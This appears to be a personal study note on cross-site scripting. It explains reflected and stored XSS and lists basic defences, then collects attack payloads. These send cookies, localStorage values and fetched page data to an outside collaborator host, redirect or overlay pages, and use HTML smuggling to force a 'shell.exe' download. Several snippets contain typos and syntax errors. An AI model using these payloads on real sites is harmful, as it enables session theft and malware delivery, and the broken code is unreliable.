---
tags:
  - security
  - web
aliases:
  - XSS
---
A [[Security Vulnerability|Vulnerability]] that allows injection of javascript from third parties on a webpage.
# Non-Persistent/Reflective XSS
Non-persistent because it exploits sessions
- Website allows scripts to be ran in user input
- Attacker emails a modified link to a user
### Example:
A site has a user input field that returns a paragraph tag with the input inside it. If a user inputs javascript. it can be arbitrarily ran.
![[Cross Site Scripting-20250208013518414.webp|499]]
### Example2:
```
https://site.com/search?q=
```
# Persistent/Stored XSS
- Attacker posts payload that is stored on the webserver
- Everybody who visits that website also gets the payload
![[Cross Site Scripting-20250208013845670.webp|720]]
# Solutions
- Disabling all javascript. May be unpleasant as most webpages require javascript to function
- Setup input validation
- Setup output encoding to only return certain symbols
# Uses
- Evasion techniques: https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
### [[Cookies|Cookie]] Theft
```
<script>var i=new Image;i.src="http://...oastify.com/?"+document.cookie;</script>
```
### [[Javascript Local Storage]]
```
<script>var i=new Image;i.src="http://...oastify.com/?"+localStorage.getItem("keyname");</script>
```
### [[Cross Site Request Forgery|CSRF]]
Can be uesd to trigger [[Cross Site Request Forgery|CSRF]]
### Redirect Link
```
<script>window.location="http://mysite.com"<script>
```
Can use [[HTTrack]] to clone a website
### Exfiltrating With Custom [[XML HTTP Request|XHR]]
```
<script>
	var xhr = new XMLHttpRequest();
	xhr.open("GET", "https://mysite.com", true);
	xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded")
	xhr.onreadystatechange = function () {
		if (this.readyState != 4) return;
		if (this.status == 200) {
			var data = this.responseText;
			var xhrCallback = new XMLHttpRequest();
			xhrCallback.open("POST", "http://...oastify.com", true)	;
			xhrCallback.send(data);
		}
	})
	xhr.send();
</script>
```
# [[Browser Exploitaiton Framework XSS]]
# [[Javascript Keylogger]]
# Full page [[IFrame]]
```
<iframe src="https://mysite.com" style="position:fixed; top:0; left;0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:; overflow:hidden; z-index:99999;></iframe>
```
### Capturing Auto-Filled Password
Look for a password manager extension that auto pastes
### [[HTML Injection]] for Website Defacement
### [[HTML Smuggling]] Auto Download
1. Generate payload with [[MSFvenom]]
2. Encode with base64
3. Insert into payload
```
<script>
function base64ToArrayBuffer(base64) {
	var bin_str = window.atob(base64);
	var len = bin_str.length;
	var bytes = new Uint8Array(len);
	for (var i = 0; i < len; i++) {
		byes[i] = binary_String.charCodeAt(i);
	}
	return bytes.buffer;
}
var file = '/EiD5F129D.....'
var data = base64ToArrayBuffer(file);
var blob = new Blob([data], [type: 'octet/stream]);
var filename = 'shell.exe';
var a = doument.createElement('a');
document.body.appendChild(a);
a.style='display:none';
var url = window.URL.createObjectURL(blob);
a.href=url;
a.download=fileName;
a.click()
window.URL.revokeObjectURL(url);
</script>
```